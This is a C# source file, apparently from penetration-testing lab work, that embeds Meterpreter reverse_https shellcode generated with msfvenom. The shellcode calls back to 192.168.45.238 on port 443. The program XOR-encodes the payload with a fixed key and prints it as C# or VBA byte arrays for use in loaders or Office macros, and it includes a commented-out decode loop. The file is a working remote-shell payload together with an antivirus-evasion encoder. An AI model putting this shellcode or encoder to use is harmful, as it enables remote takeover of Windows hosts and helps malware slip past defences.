﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XorCoder
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.238 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[714] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
            0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
            0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x44,0x8b,0x40,0x20,0x50,0x49,0x01,0xd0,0x8b,0x48,0x18,
            0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
            0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,
            0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
            0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,
            0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,
            0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
            0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
            0x2e,0x34,0x35,0x2e,0x32,0x33,0x38,0x00,0x5a,0x48,0x89,0xc1,
            0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,
            0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,
            0x00,0xff,0xd5,0xe8,0x9f,0x00,0x00,0x00,0x2f,0x6a,0x50,0x62,
            0x46,0x4a,0x4b,0x36,0x75,0x69,0x65,0x50,0x6a,0x41,0x4f,0x49,
            0x43,0x68,0x56,0x66,0x49,0x6e,0x51,0x4b,0x32,0x6d,0x32,0x61,
            0x45,0x77,0x77,0x73,0x6b,0x79,0x62,0x78,0x5f,0x4a,0x66,0x42,
            0x6e,0x34,0x2d,0x71,0x62,0x64,0x54,0x65,0x46,0x44,0x79,0x34,
            0x7a,0x47,0x68,0x4d,0x41,0x41,0x46,0x42,0x67,0x65,0x75,0x42,
            0x31,0x58,0x48,0x31,0x6e,0x52,0x6a,0x65,0x4d,0x49,0x4a,0x70,
            0x59,0x33,0x37,0x79,0x70,0x32,0x6d,0x6e,0x6f,0x53,0x6e,0x70,
            0x4c,0x7a,0x63,0x31,0x59,0x4b,0x6b,0x45,0x79,0x75,0x41,0x32,
            0x4d,0x38,0x58,0x43,0x46,0x50,0x70,0x4f,0x56,0x32,0x37,0x58,
            0x69,0x67,0x44,0x49,0x5a,0x46,0x4c,0x56,0x79,0x30,0x55,0x53,
            0x4e,0x4a,0x4d,0x30,0x73,0x61,0x68,0x45,0x57,0x44,0x38,0x4f,
            0x39,0x6a,0x72,0x48,0x75,0x33,0x6a,0x6f,0x34,0x4b,0x38,0x31,
            0x32,0x5f,0x79,0x72,0x70,0x2d,0x7a,0x36,0x6e,0x45,0x00,0x48,
            0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,
            0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,
            0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,
            0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,
            0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,
            0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,
            0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,
            0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,
            0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,
            0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,
            0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,
            0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,
            0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,
            0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,
            0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,
            0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,
            0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,
            0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,
            0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5
            };


            // Encode the payload with XOR (fixed key)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex;

            if (args.Length > 0)
            {
                switch (args[0])
                {
                    case "-VBA":
                        // Printout VBA payload
                        uint counter = 0;

                        hex = new StringBuilder(encoded.Length * 2);
                        foreach (byte b in encoded)
                        {
                            hex.AppendFormat("{0:D3}, ", b);
                            counter++;
                            if (counter % 64 == 0)
                            {
                                hex.Append("_\n");
                            }
                        }
                        Console.WriteLine($"XORed VBA payload (key: 0xfa):");
                        Console.WriteLine(hex.ToString());
                        break;
                    default:
                        Console.WriteLine("Accepted arguments: -VBA to print VBA payload instead of C#");
                        break;
                }
            }
            else
            {
                // Printout C# payload
                hex = new StringBuilder(encoded.Length * 2);
                int totalCount = encoded.Length;
                for (int count = 0; count < totalCount; count++)
                {
                    byte b = encoded[count];

                    if ((count + 1) == totalCount) // Dont append comma for last item
                    {
                        hex.AppendFormat("0x{0:x2}", b);
                    }
                    else
                    {
                        hex.AppendFormat("0x{0:x2}, ", b);
                    }

                    if ((count + 1) % 15 == 0)
                    {
                        hex.Append("\n");
                    }
                }

                Console.WriteLine($"XORed C# payload (key: 0xfa):");
                Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
            }




            // Decode the XOR payload
            /*
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            */

        }
    }
}
